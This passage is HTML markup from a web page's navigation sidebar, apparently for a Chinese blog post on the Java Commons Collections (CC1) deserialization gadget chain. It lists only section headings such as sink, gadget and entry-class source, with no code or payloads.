href="#%E5%88%A9%E7%94%A8%E9%93%BE-gt-%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="nav-number">3.2.</span> <span class="nav-text">利用链-&gt;入口类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CC1"><span class="nav-number">4.</span> <span class="nav-text">CC1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87-sink"><span class="nav-number">4.1.</span> <span class="nav-text">目标-sink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-gadget"><span class="nav-number">4.2.</span> <span class="nav-text">利用链-gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BBsource"><span class="nav-number">4.3.</span> <span class="nav-text">入口类source</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
